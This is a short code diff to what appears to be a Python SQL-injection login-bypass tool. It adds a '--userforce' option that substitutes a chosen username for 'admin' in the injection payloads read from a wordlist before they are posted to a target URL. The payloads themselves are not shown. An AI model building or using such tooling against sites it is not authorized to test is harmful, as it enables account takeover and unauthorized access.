@@ -41,7 +41,14 @@ class MY_SQL_IN:
                  list_command  = list_command .readlines()   
 
              for command in list_command :  
-                 command  = str(command.strip())          
+                 if self.args.userforce:
+                    if "admin" in command:
+                        command = str(command.replace('admin',self.args.userforce).replace('\n','').strip())
+                    else:
+                        command  = str(command.strip())    
+
+                 else:
+                    command  = str(command.strip())   
                  url = self.args.URL
                  request = mechanize.Browser()
                  request.set_handle_robots(False)
@@ -296,7 +303,9 @@ class MY_SQL_IN:
         parser.add_argument("-pI","--PassInput"  , action='store_true'           ,help ="use to POST in Password field")
         parser.add_argument("-uI","--UserInput"  , action='store_true'           ,help ="use to POST in user field")
         parser.add_argument("-N","--user"       , action=None                   ,help ="use specific username ")
-        parser.add_argument("-P","--password"   , action=None                   ,help ="use specific Passowrd")         
+        parser.add_argument("-P","--password"   , action=None                   ,help ="use specific Passowrd")     
+        parser.add_argument("-U", "--userforce", action=None, help="Specify a specific username from a wordlist to brute force")
+    
         self.args = parser.parse_args()  
         print(W+"")
         if len(sys.argv)!=1 :
